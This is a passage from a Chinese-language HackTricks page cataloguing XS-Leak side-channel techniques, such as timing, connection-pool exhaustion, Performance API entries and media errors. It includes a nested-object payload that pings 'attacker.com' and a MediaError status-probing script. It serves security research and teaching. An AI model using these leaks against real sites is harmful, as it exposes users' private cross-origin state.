# XS-Search/XS-Leaks

{{#include ../../banners/hacktricks-training.md}}

## 基本信息

XS-Search 是一种通过利用 **侧信道漏洞** 来 **提取跨源信息** 的方法。

此攻击涉及的关键组件包括：

- **易受攻击的网页**：目标网站，信息旨在从中提取。
- **攻击者的网页**：攻击者创建的恶意网站，受害者访问，托管漏洞。
- **包含方法**：用于将易受攻击的网页纳入攻击者网页的技术（例如，window.open、iframe、fetch、带有 href 的 HTML 标签等）。
- **泄漏技术**：用于根据通过包含方法收集的信息来辨别易受攻击网页状态差异的技术。
- **状态**：易受攻击网页的两种潜在条件，攻击者旨在区分。
- **可检测差异**：攻击者依赖于的可观察变化，以推断易受攻击网页的状态。

### 可检测差异

可以分析多个方面以区分易受攻击网页的状态：

- **状态码**：区分 **各种 HTTP 响应状态码** 跨源，如服务器错误、客户端错误或身份验证错误。
- **API 使用**：识别跨页面的 **Web API 使用情况**，揭示跨源页面是否使用特定的 JavaScript Web API。
- **重定向**：检测导航到不同页面，不仅仅是 HTTP 重定向，还有由 JavaScript 或 HTML 触发的重定向。
- **页面内容**：观察 **HTTP 响应体中的变化** 或页面子资源中的变化，例如 **嵌入框架的数量** 或图像的大小差异。
- **HTTP 头**：注意 **特定 HTTP 响应头** 的存在或可能的值，包括 X-Frame-Options、Content-Disposition 和 Cross-Origin-Resource-Policy 等头。
- **时间**：注意两个状态之间的一致时间差异。

### 包含方法

- **HTML 元素**：HTML 提供多种元素用于 **跨源资源包含**，如样式表、图像或脚本，迫使浏览器请求非 HTML 资源。可以在 [https://github.com/cure53/HTTPLeaks](https://github.com/cure53/HTTPLeaks) 找到此目的的潜在 HTML 元素的汇编。
- **框架**：如 **iframe**、**object** 和 **embed** 的元素可以将 HTML 资源直接嵌入攻击者的页面。如果页面 **缺乏框架保护**，JavaScript 可以通过 contentWindow 属性访问框架资源的窗口对象。
- **弹出窗口**：**`window.open`** 方法在新标签或窗口中打开资源，为 JavaScript 提供 **窗口句柄** 以与遵循 SOP 的方法和属性进行交互。弹出窗口通常用于单点登录，绕过目标资源的框架和 cookie 限制。然而，现代浏览器限制弹出窗口的创建仅限于某些用户操作。
- **JavaScript 请求**：JavaScript 允许使用 **XMLHttpRequests** 或 **Fetch API** 直接请求目标资源。这些方法提供对请求的精确控制，例如选择跟随 HTTP 重定向。

### 泄漏技术

- **事件处理程序**：XS-Leaks 中的一种经典泄漏技术，其中事件处理程序如 **onload** 和 **onerror** 提供有关资源加载成功或失败的见解。
- **错误消息**：JavaScript 异常或特殊错误页面可以直接从错误消息中提供泄漏信息，或通过区分其存在与否来提供信息。
- **全局限制**：浏览器的物理限制，如内存容量或其他强制的浏览器限制，可以在达到阈值时发出信号，作为泄漏技术。
- **全局状态**：可检测的与浏览器 **全局状态**（例如，历史接口）的交互可以被利用。例如，浏览器历史中的 **条目数量** 可以提供有关跨源页面的线索。
- **性能 API**：此 API 提供 **当前页面的性能细节**，包括文档和加载资源的网络时序，使得对请求资源的推断成为可能。
- **可读属性**：某些 HTML 属性是 **跨源可读的**，可以用作泄漏技术。例如，`window.frame.length` 属性允许 JavaScript 计算跨源网页中包含的框架数量。

## XSinator 工具与论文

XSinator 是一个自动化工具，用于 **检查浏览器是否存在多种已知的 XS-Leaks**，详见其论文：[**https://xsinator.com/paper.pdf**](https://xsinator.com/paper.pdf)

您可以 **访问该工具** [**https://xsinator.com/**](https://xsinator.com/)

> [!WARNING]
> **排除的 XS-Leaks**：我们不得不排除依赖于 **服务工作者** 的 XS-Leaks，因为它们会干扰 XSinator 中的其他泄漏。此外，我们选择 **排除依赖于特定 Web 应用程序中的错误配置和漏洞的 XS-Leaks**。例如，跨源资源共享（CORS）错误配置、postMessage 泄漏或跨站脚本。此外，我们还排除了基于时间的 XS-Leaks，因为它们通常存在缓慢、嘈杂和不准确的问题。

## **基于时间的技术**

以下一些技术将使用时间作为检测网页可能状态差异的过程的一部分。测量时间在网页浏览器中有不同的方法。

**时钟**： [performance.now()](https://developer.mozilla.org/en-US/docs/Web/API/Performance/now) API 允许开发人员获取高分辨率的时间测量。\
攻击者可以滥用大量 API 来创建隐式时钟：[Broadcast Channel API](https://developer.mozilla.org/en-US/docs/Web/API/Broadcast_Channel_API)、[Message Channel API](https://developer.mozilla.org/en-US/docs/Web/API/MessageChannel)、[requestAnimationFrame](https://developer.mozilla.org/en-US/docs/Web/API/window/requestAnimationFrame)、[setTimeout](https://developer.mozilla.org/en-US/docs/Web/API/WindowOrWorkerGlobalScope/setTimeout)、CSS 动画等。\
更多信息请参见：[https://xsleaks.dev/docs/attacks/timing-attacks/clocks](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/)。

## 事件处理程序技术

### Onload/Onerror

- **包含方法**：框架，HTML 元素
- **可检测差异**：状态码
- **更多信息**：[https://www.usenix.org/conference/usenixsecurity19/presentation/staicu](https://www.usenix.org/conference/usenixsecurity19/presentation/staicu)，[https://xsleaks.dev/docs/attacks/error-events/](https://xsleaks.dev/docs/attacks/error-events/)
- **总结**：如果尝试加载资源，onerror/onload 事件在资源成功/失败加载时被触发，可以推断出状态码。
- **代码示例**：[https://xsinator.com/testing.html#Event%20Handler%20Leak%20(Script)](<https://xsinator.com/testing.html#Event%20Handler%20Leak%20(Script)>)

{{#ref}}
cookie-bomb-+-onerror-xs-leak.md
{{#endref}}

代码示例尝试 **从 JS 加载脚本对象**，但 **其他标签** 如对象、样式表、图像、音频也可以使用。此外，还可以直接注入 **标签** 并在标签内声明 `onload` 和 `onerror` 事件（而不是从 JS 注入）。

此攻击还有一个无脚本版本：
```html
<object data="//example.com/404">
<object data="//attacker.com/?error"></object>
</object>
```
在这种情况下，如果 `example.com/404` 未找到，将加载 `attacker.com/?error`。

### 加载时机

- **包含方法**: HTML 元素
- **可检测差异**: 时机（通常由于页面内容、状态码）
- **更多信息**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events)
- **总结:** [**performance.now()**](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) **API** 可用于测量执行请求所需的时间。然而，也可以使用其他时钟，例如 [**PerformanceLongTaskTiming API**](https://developer.mozilla.org/en-US/docs/Web/API/PerformanceLongTaskTiming)，它可以识别运行超过 50 毫秒的任务。
- **代码示例**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events) 另一个示例在：

{{#ref}}
performance.now-example.md
{{#endref}}

#### 加载时机 + 强制重任务

此技术与前一种相似，但 **攻击者** 还将 **强制** 一些操作以花费 **相关的时间**，无论 **答案是正面还是负面**，并测量该时间。

{{#ref}}
performance.now-+-force-heavy-task.md
{{#endref}}

### 卸载/卸载前时机

- **包含方法**: 框架
- **可检测差异**: 时机（通常由于页面内容、状态码）
- **更多信息**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events)
- **总结:** [SharedArrayBuffer 时钟](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#sharedarraybuffer-and-web-workers) 可用于测量执行请求所需的时间。也可以使用其他时钟。
- **代码示例**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events)

获取资源所需的时间可以通过利用 [`unload`](https://developer.mozilla.org/en-US/docs/Web/API/Window/unload_event) 和 [`beforeunload`](https://developer.mozilla.org/en-US/docs/Web/API/Window/beforeunload_event) 事件来测量。**`beforeunload`** 事件在浏览器即将导航到新页面时触发，而 **`unload`** 事件在实际进行导航时发生。这两个事件之间的时间差可以计算出 **浏览器获取资源所花费的时间**。

### 沙箱框架时机 + 加载 <a href="#sandboxed-frame-timing-attacks" id="sandboxed-frame-timing-attacks"></a>

- **包含方法**: 框架
- **可检测差异**: 时机（通常由于页面内容、状态码）
- **更多信息**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks)
- **总结:** [performance.now()](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) API 可用于测量执行请求所需的时间。也可以使用其他时钟。
- **代码示例**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks)

已观察到，在没有 [框架保护](https://xsleaks.dev/docs/defenses/opt-in/xfo/) 的情况下，攻击者可以测量页面及其子资源在网络上加载所需的时间。此测量通常是可能的，因为 iframe 的 `onload` 处理程序仅在资源加载和 JavaScript 执行完成后触发。为了绕过脚本执行引入的可变性，攻击者可能会在 `<iframe>` 中使用 [`sandbox`](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/iframe) 属性。包含此属性会限制许多功能，特别是 JavaScript 的执行，从而促进主要受网络性能影响的测量。
```javascript
// Example of an iframe with the sandbox attribute
<iframe src="example.html" sandbox></iframe>
```
### #ID + error + onload

- **包含方法**: Frames
- **可检测差异**: 页面内容
- **更多信息**:
- **总结**: 如果你可以在访问正确内容时使页面出错，并在访问任何内容时使其正确加载，那么你可以创建一个循环来提取所有信息，而无需测量时间。
- **代码示例**:

假设你可以**插入**包含**秘密**内容的**页面****在一个 Iframe** 中。

你可以**让受害者搜索**包含“_**flag**_”的文件，使用**Iframe**（例如利用 CSRF）。在 Iframe 内，你知道 _**onload 事件**_ 将**至少执行一次**。然后，你可以**更改** **iframe** 的**URL**，但只更改**URL**中**hash**的**内容**。

例如：

1. **URL1**: www.attacker.com/xssearch#try1
2. **URL2**: www.attacker.com/xssearch#try2

如果第一个 URL **成功加载**，那么，当**更改** URL 的**hash**部分时，**onload**事件**不会再次触发**。但**如果**页面在**加载**时出现某种**错误**，那么，**onload**事件将**再次触发**。

然后，你可以**区分**一个**正确**加载的页面或在访问时有**错误**的页面。

### Javascript 执行

- **包含方法**: Frames
- **可检测差异**: 页面内容
- **更多信息**:
- **总结**: 如果**页面**返回**敏感**内容，**或**用户可以**控制**的**内容**。用户可以在**负面情况下**设置**有效的 JS 代码**，并在每次尝试中**加载**在**`<script>`**标签内，因此在**负面**情况下攻击者的**代码**被**执行**，而在**肯定**情况下**什么**都不会被执行。
- **代码示例**:

{{#ref}}
javascript-execution-xs-leak.md
{{#endref}}

### CORB - Onerror

- **包含方法**: HTML 元素
- **可检测差异**: 状态码 & 头部
- **更多信息**: [https://xsleaks.dev/docs/attacks/browser-features/corb/](https://xsleaks.dev/docs/attacks/browser-features/corb/)
- **总结**: **跨源读取阻止 (CORB)** 是一种安全措施，防止网页加载某些敏感的跨源资源，以保护免受**Spectre**等攻击。然而，攻击者可以利用其保护行为。当受**CORB**保护的响应返回带有 `nosniff` 的 _**CORB 保护**_ `Content-Type` 和 `2xx` 状态码时，**CORB** 会剥离响应的主体和头部。观察到这一点的攻击者可以推断出**状态码**（指示成功或错误）和 `Content-Type`（表示是否受到**CORB**保护）的组合，从而导致潜在的信息泄露。
- **代码示例**:

查看更多信息链接以获取有关攻击的更多信息。

### onblur

- **包含方法**: Frames
- **可检测差异**: 页面内容
- **更多信息**: [https://xsleaks.dev/docs/attacks/id-attribute/](https://xsleaks.dev/docs/attacks/id-attribute/), [https://xsleaks.dev/docs/attacks/experiments/portals/](https://xsleaks.dev/docs/attacks/experiments/portals/)
- **总结**: 从 id 或 name 属性泄露敏感数据。
- **代码示例**: [https://xsleaks.dev/docs/attacks/id-attribute/#code-snippet](https://xsleaks.dev/docs/attacks/id-attribute/#code-snippet)

可以**在一个 iframe 中加载一个页面**，并使用**`#id_value`**使页面**聚焦于**指定的 iframe 元素，如果触发了**`onblur`**信号，则 ID 元素存在。\
你可以使用**`portal`**标签执行相同的攻击。

### postMessage 广播 <a href="#postmessage-broadcasts" id="postmessage-broadcasts"></a>

- **包含方法**: Frames, Pop-ups
- **可检测差异**: API 使用
- **更多信息**: [https://xsleaks.dev/docs/attacks/postmessage-broadcasts/](https://xsleaks.dev/docs/attacks/postmessage-broadcasts/)
- **总结**: 从 postMessage 收集敏感信息，或使用 postMessages 的存在作为一个神谕，以了解用户在页面上的状态
- **代码示例**: `任何监听所有 postMessages 的代码。`

应用程序经常利用 [`postMessage` 广播](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage) 在不同源之间进行通信。然而，如果 `targetOrigin` 参数未正确指定，这种方法可能会无意中暴露**敏感信息**，允许任何窗口接收消息。此外，接收消息的行为本身可以充当一个**神谕**；例如，某些消息可能仅发送给已登录的用户。因此，这些消息的存在或缺失可以揭示有关用户状态或身份的信息，例如他们是否经过身份验证。

## 全局限制技术

### WebSocket API

- **包含方法**: Frames, Pop-ups
- **可检测差异**: API 使用
- **更多信息**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.1)
- **总结**: 耗尽 WebSocket 连接限制泄露跨源页面的 WebSocket 连接数量。
- **代码示例**: [https://xsinator.com/testing.html#WebSocket%20Leak%20(FF)](<https://xsinator.com/testing.html#WebSocket%20Leak%20(FF)>), [https://xsinator.com/testing.html#WebSocket%20Leak%20(GC)](<https://xsinator.com/testing.html#WebSocket%20Leak%20(GC)>)

可以识别目标页面使用了多少个**WebSocket 连接**。这使攻击者能够检测应用程序状态并泄露与 WebSocket 连接数量相关的信息。

如果一个**源**使用了**最大数量的 WebSocket**连接对象，无论其连接状态如何，创建**新对象将导致 JavaScript 异常**。要执行此攻击，攻击者网站在弹出窗口或 iframe 中打开目标网站，然后，在目标网页加载后，尝试创建尽可能多的 WebSocket 连接。**抛出的异常数量**就是**目标网站**窗口使用的**WebSocket 连接数量**。

### 支付 API

- **包含方法**: Frames, Pop-ups
- **可检测差异**: API 使用
- **更多信息**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.1)
- **总结**: 检测支付请求，因为一次只能有一个处于活动状态。
- **代码示例**: [https://xsinator.com/testing.html#Payment%20API%20Leak](https://xsinator.com/testing.html#Payment%20API%20Leak)

此 XS-Leak 使攻击者能够**检测跨源页面何时发起支付请求**。

因为**一次只能有一个支付请求处于活动状态**，如果目标网站使用支付请求 API，任何进一步尝试使用此 API 将失败，并导致**JavaScript 异常**。攻击者可以通过**定期尝试显示支付 API UI**来利用这一点。如果一次尝试导致异常，则目标网站当前正在使用它。攻击者可以通过在创建后立即关闭 UI 来隐藏这些定期尝试。

### 事件循环计时 <a href="#timing-the-event-loop" id="timing-the-event-loop"></a>

- **包含方法**:
- **可检测差异**: 时间（通常由于页面内容、状态码）
- **更多信息**: [https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#timing-the-event-loop](https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#timing-the-event-loop)
- **总结**: 测量一个网页的执行时间，利用单线程的 JS 事件循环。
- **代码示例**:

{{#ref}}
event-loop-blocking-+-lazy-images.md
{{#endref}}

JavaScript 在 [单线程事件循环](https://developer.mozilla.org/en-US/docs/Web/JavaScript/EventLoop) 并发模型上运行，这意味着**它一次只能执行一个任务**。这一特性可以被利用来评估**来自不同源的代码执行所需的时间**。攻击者可以通过不断调度具有固定属性的事件来测量其在事件循环中的执行时间。这些事件将在事件池为空时被处理。如果其他源也在向同一池调度事件，攻击者可以通过观察自己任务执行的延迟来推断这些外部事件的执行时间。这种监控事件循环延迟的方法可以揭示来自不同源的代码的执行时间，可能暴露敏感信息。

> [!WARNING]
> 在执行计时中，可以**消除** **网络因素**以获得**更精确的测量**。例如，通过在加载页面之前加载所使用的资源。

### 忙碌事件循环 <a href="#busy-event-loop" id="busy-event-loop"></a>

- **包含方法**:
- **可检测差异**: 时间（通常由于页面内容、状态码）
- **更多信息**: [https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#busy-event-loop](https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#busy-event-loop)
- **总结**: 测量网页操作执行时间的一种方法是故意阻塞线程的事件循环，然后计时**事件循环再次可用所需的时间**。通过在事件循环中插入一个阻塞操作（例如长时间计算或同步 API 调用），并监控后续代码开始执行所需的时间，可以推断出在阻塞期间事件循环中执行的任务的持续时间。这一技术利用了 JavaScript 事件循环的单线程特性，其中任务是顺序执行的，可以提供对共享同一线程的其他操作的性能或行为的洞察。
- **代码示例**:

通过锁定事件循环来测量执行时间的技术的一个显著优势是其潜在的绕过**站点隔离**。**站点隔离**是一种安全特性，将不同网站分隔到不同的进程中，旨在防止恶意网站直接访问其他网站的敏感数据。然而，通过影响通过共享事件循环的另一个源的执行时机，攻击者可以间接提取有关该源活动的信息。这种方法不依赖于直接访问另一个源的数据，而是观察该源活动对共享事件循环的影响，从而规避**站点隔离**建立的保护屏障。

> [!WARNING]
> 在执行计时中，可以**消除** **网络因素**以获得**更精确的测量**。例如，通过在加载页面之前加载所使用的资源。

### 连接池

- **包含方法**: JavaScript 请求
- **可检测差异**: 时间（通常由于页面内容、状态码）
- **更多信息**: [https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/](https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/)
- **总结**: 攻击者可以锁定所有插座，除了 1 个，加载目标网页，同时加载另一个页面，直到最后一个页面开始加载的时间就是目标页面加载所需的时间。
- **代码示例**:

{{#ref}}
connection-pool-example.md
{{#endref}}

浏览器利用插座进行服务器通信，但由于操作系统和硬件的资源有限，**浏览器被迫施加限制**，限制并发插座的数量。攻击者可以通过以下步骤利用这一限制：

1. 确定浏览器的插座限制，例如，256 个全局插座。
2. 通过向不同主机发起 255 个请求，长时间占用 255 个插座，旨在保持连接开放而不完成。
3. 使用第 256 个插座向目标页面发送请求。
4. 尝试向不同主机发起第 257 个请求。由于所有插座都在使用中（根据步骤 2 和 3），此请求将被排队，直到有插座可用。此请求进行之前的延迟为攻击者提供了与第 256 个插座（目标页面的插座）相关的网络活动的时间信息。这一推断是可能的，因为步骤 2 中的 255 个插座仍在使用，这意味着任何新可用的插座必须是从步骤 3 中释放的。第 256 个插座变得可用所需的时间因此直接与请求目标页面完成所需的时间相关联。

更多信息请参见: [https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/](https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/)

### 按目标的连接池

- **包含方法**: JavaScript 请求
- **可检测差异**: 时间（通常由于页面内容、状态码）
- **更多信息**:
- **总结**: 这与前面的技术类似，但 Google **Chrome** 对**同一源的并发请求**限制为**6 个**。如果我们**阻塞 5 个**，然后**发起第 6 个**请求，我们可以**计时**，如果我们设法让**受害者页面发送**更多**请求**到同一端点以检测页面的**状态**，第 **6 个请求**将需要**更长时间**，我们可以检测到它。

## 性能 API 技术

[`性能 API`](https://developer.mozilla.org/en-US/docs/Web/API/Performance) 提供了对 Web 应用程序性能指标的洞察，进一步通过 [`资源计时 API`](https://developer.mozilla.org/en-US/docs/Web/API/Resource_Timing_API) 得到增强。资源计时 API 使监控详细的网络请求时序成为可能，例如请求的持续时间。值得注意的是，当服务器在其响应中包含 `Timing-Allow-Origin: *` 头时，诸如传输大小和域查找时间等额外数据将变得可用。

这些丰富的数据可以通过 [`performance.getEntries`](https://developer.mozilla.org/en-US/docs/Web/API/Performance/getEntries) 或 [`performance.getEntriesByName`](https://developer.mozilla.org/en-US/docs/Web/API/Performance/getEntriesByName) 等方法检索，提供全面的性能相关信息。此外，该 API 通过计算从 [`performance.now()`](https://developer.mozilla.org/en-US/docs/Web/API/Performance/now) 获取的时间戳之间的差异来测量执行时间。然而，值得注意的是，对于某些浏览器（如 Chrome）中的操作，`performance.now()` 的精度可能仅限于毫秒，这可能影响计时测量的粒度。

除了计时测量外，性能 API 还可以用于安全相关的洞察。例如，Chrome 中 `performance` 对象中页面的存在或缺失可以指示 `X-Frame-Options` 的应用。具体来说，如果由于 `X-Frame-Options` 而阻止页面在框架中呈现，则不会在 `performance` 对象中记录该页面，从而提供有关页面框架策略的微妙线索。

### 错误泄露

- **包含方法**: Frames, HTML 元素
- **可检测差异**: 状态码
- **更多信息**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
- **总结**: 导致错误的请求不会创建资源计时条目。
- **代码示例**: [https://xsinator.com/testing.html#Performance%20API%20Error%20Leak](https://xsinator.com/testing.html#Performance%20API%20Error%20Leak)

可以**区分 HTTP 响应状态码**，因为导致**错误**的请求**不会创建性能条目**。

### 样式重载错误

- **包含方法**: HTML 元素
- **可检测差异**: 状态码
- **更多信息**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
- **总结**: 由于浏览器错误，导致错误的请求会被加载两次。
- **代码示例**: [https://xsinator.com/testing.html#Style%20Reload%20Error%20Leak](https://xsinator.com/testing.html#Style%20Reload%20Error%20Leak)

在前面的技术中，还识别出浏览器 GC 中的两个案例，导致**资源在加载失败时被加载两次**。这将导致性能 API 中出现多个条目，因此可以被检测到。

### 请求合并错误

- **包含方法**: HTML 元素
- **可检测差异**: 状态码
- **更多信息**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
- **总结**: 导致错误的请求无法合并。
- **代码示例**: [https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak](https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak)

该技术在提到的论文中的表格中发现，但未找到该技术的描述。然而，你可以在 [https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak](https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak) 中检查源代码。

### 空页面泄露

- **包含方法**: Frames
- **可检测差异**: 页面内容
- **更多信息**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
- **总结**: 空响应不会创建资源计时条目。
- **代码示例**: [https://xsinator.com/testing.html#Performance%20API%20Empty%20Page%20Leak](https://xsinator.com/testing.html#Performance%20API%20Empty%20Page%20Leak)

攻击者可以检测请求是否导致空的 HTTP 响应体，因为**空页面在某些浏览器中不会创建性能条目**。

### **XSS-Auditor 泄露**

- **包含方法**: Frames
- **可检测差异**: 页面内容
- **更多信息**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
- **总结**: 使用安全声明中的 XSS 审计器，攻击者可以通过观察在构造有效负载触发审计器过滤机制时响应的变化来检测特定网页元素。
- **代码示例**: [https://xsinator.com/testing.html#Performance%20API%20XSS%20Auditor%20Leak](https://xsinator.com/testing.html#Performance%20API%20XSS%20Auditor%20Leak)

在安全声明 (SA) 中，XSS 审计器最初旨在防止跨站脚本 (XSS) 攻击，但可以悖论地被利用来泄露敏感信息。尽管这一内置特性已从 Google Chrome (GC) 中移除，但在 SA 中仍然存在。2013 年，Braun 和 Heiderich 证明 XSS 审计器可能会意外阻止合法脚本，导致误报。在此基础上，研究人员开发了提取信息和检测跨源页面特定内容的技术，这一概念被称为 XS-Leaks，最初由 Terada 报告，并由 Heyes 在博客文章中详细阐述。尽管这些技术特定于 GC 中的 XSS 审计器，但发现 SA 中被 XSS 审计器阻止的页面不会在性能 API 中生成条目，从而揭示了一种可能仍然泄露敏感信息的方法。

### X-Frame 泄露

- **包含方法**: Frames
- **可检测差异**: 头部
- **更多信息**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2), [https://xsleaks.github.io/xsleaks/examples/x-frame/index.html](https://xsleaks.github.io/xsleaks/examples/x-frame/index.html), [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-x-frame-options](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-x-frame-options)
- **总结**: 带有 X-Frame-Options 头的资源不会创建资源计时条目。
- **代码示例**: [https://xsinator.com/testing.html#Performance%20API%20X-Frame%20Leak](https://xsinator.com/testing.html#Performance%20API%20X-Frame%20Leak)

如果页面**不允许**在**iframe**中**呈现**，则不会**创建性能条目**。因此，攻击者可以检测响应头**`X-Frame-Options`**。\
如果使用**embed** **标签**，情况也是如此。

### 下载检测

- **包含方法**: Frames
- **可检测差异**: 头部
- **更多信息**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
- **总结**: 下载不会在性能 API 中创建资源计时条目。
- **代码示例**: [https://xsinator.com/testing.html#Performance%20API%20Download%20Detection](https://xsinator.com/testing.html#Performance%20API%20Download%20Detection)

与描述的 XS-Leak 类似，由于 ContentDisposition 头，**下载的资源**也**不会创建性能条目**。该技术在所有主要浏览器中均有效。

### 重定向开始泄露

- **包含方法**: Frames
- **可检测差异**: 重定向
- **更多信息**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
- **总结**: 资源计时条目泄露重定向的开始时间。
- **代码示例**: [https://xsinator.com/testing.html#Redirect%20Start%20Leak](https://xsinator.com/testing.html#Redirect%20Start%20Leak)

我们发现一个 XS-Leak 实例，利用某些浏览器记录过多跨源请求信息的行为。标准定义了一组应为跨源资源设置为零的属性。然而，在**SA**中，可以通过查询**性能 API**并检查**redirectStart 计时数据**来检测用户是否被目标页面**重定向**。

### 持续时间重定向泄露

- **包含方法**: Fetch API
- **可检测差异**: 重定向
- **更多信息**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
- **总结**: 当发生重定向时，计时条目的持续时间为负值。
- **代码示例**: [https://xsinator.com/testing.html#Duration%20Redirect%20Leak](https://xsinator.com/testing.html#Duration%20Redirect%20Leak)

在 GC 中，导致**重定向**的请求的**持续时间**为**负值**，因此可以与不导致重定向的请求**区分**开来。

### CORP 泄露

- **包含方法**: Frames
- **可检测差异**: 头部
- **更多信息**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
- **总结**: 受 CORP 保护的资源不会创建资源计时条目。
- **代码示例**: [https://xsinator.com/testing.html#Performance%20API%20CORP%20Leak](https://xsinator.com/testing.html#Performance%20API%20CORP%20Leak)

在某些情况下，**nextHopProtocol 条目**可以用作泄露技术。在 GC 中，当设置**CORP 头**时，nextHopProtocol 将是**空的**。请注意，SA 对于启用 CORP 的资源根本不会创建性能条目。

### 服务工作者

- **包含方法**: Frames
- **可检测差异**: API 使用
- **更多信息**: [https://www.ndss-symposium.org/ndss-paper/awakening-the-webs-sleeper-agents-misusing-service-workers-for-privacy-leakage/](https://www.ndss-symposium.org/ndss-paper/awakening-the-webs-sleeper-agents-misusing-service-workers-for-privacy-leakage/)
- **总结**: 检测特定源是否注册了服务工作者。
- **代码示例**:

服务工作者是事件驱动的脚本上下文，在一个源上运行。它们在网页的后台运行，可以拦截、修改和**缓存资源**以创建离线 Web 应用程序。\
如果通过**iframe**访问**服务工作者**缓存的**资源**，该资源将从**服务工作者缓存**中**加载**。\
要检测资源是否**从服务工作者**缓存中加载，可以使用**性能 API**。\
这也可以通过计时攻击来完成（有关更多信息，请查看论文）。

### 缓存

- **包含方法**: Fetch API
- **可检测差异**: 时间
- **更多信息**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources)
- **总结**: 可以检查资源是否存储在缓存中。
- **代码示例**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources), [https://xsinator.com/testing.html#Cache%20Leak%20(POST)](<https://xsinator.com/testing.html#Cache%20Leak%20(POST)>)

使用 [性能 API](./#performance-api) 可以检查资源是否被缓存。

### 网络持续时间

- **包含方法**: Fetch API
- **可检测差异**: 页面内容
- **更多信息**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration)
- **总结**: 可以从 `performance` API 中检索请求的网络持续时间。
- **代码示例**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration)

## 错误消息技术

### 媒体错误

- **包含方法**: HTML 元素 (视频, 音频)
- **可检测差异**: 状态码
- **更多信息**: [https://bugs.chromium.org/p/chromium/issues/detail?id=828265](https://bugs.chromium.org/p/chromium/issues/detail?id=828265)
- **总结**: 在 Firefox 中，可以准确泄露跨源请求的状态码。
- **代码示例**: [https://jsbin.com/nejatopusi/1/edit?html,css,js,output](https://jsbin.com/nejatopusi/1/edit?html,css,js,output)
```javascript
// Code saved here in case it dissapear from the link
// Based on MDN MediaError example: https://mdn.github.io/dom-examples/media/mediaerror/
window.addEventListener("load", startup, false)
function displayErrorMessage(msg) {
document.getElementById("log").innerHTML += msg
}

function startup() {
let audioElement = document.getElementById("audio")
// "https://mdn.github.io/dom-examples/media/mediaerror/assets/good.mp3";
document.getElementById("startTest").addEventListener(
"click",
function () {
audioElement.src = document.getElementById("testUrl").value
},
false
)
// Create the event handler
var errHandler = function () {
let err = this.error
let message = err.message
let status = ""

// Chrome error.message when the request loads successfully: "DEMUXER_ERROR_COULD_NOT_OPEN: FFmpegDemuxer: open context failed"
// Firefox error.message when the request loads successfully: "Failed to init decoder"
if (
message.indexOf("DEMUXER_ERROR_COULD_NOT_OPEN") != -1 ||
message.indexOf("Failed to init decoder") != -1
) {
status = "Success"
} else {
status = "Error"
}
displayErrorMessage(
"<strong>Status: " +
status +
"</strong> (Error code:" +
err.code +
" / Error Message: " +
err.message +
")<br>"
)
}
audioElement.onerror = errHandler
}
```
`MediaError` 接口的 message 属性通过一个独特的字符串唯一标识成功加载的资源。攻击者可以通过观察消息内容来利用此特性，从而推断跨源资源的响应状态。

### CORS 错误

- **包含方法**: Fetch API
- **可检测差异**: Header
- **更多信息**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.3)
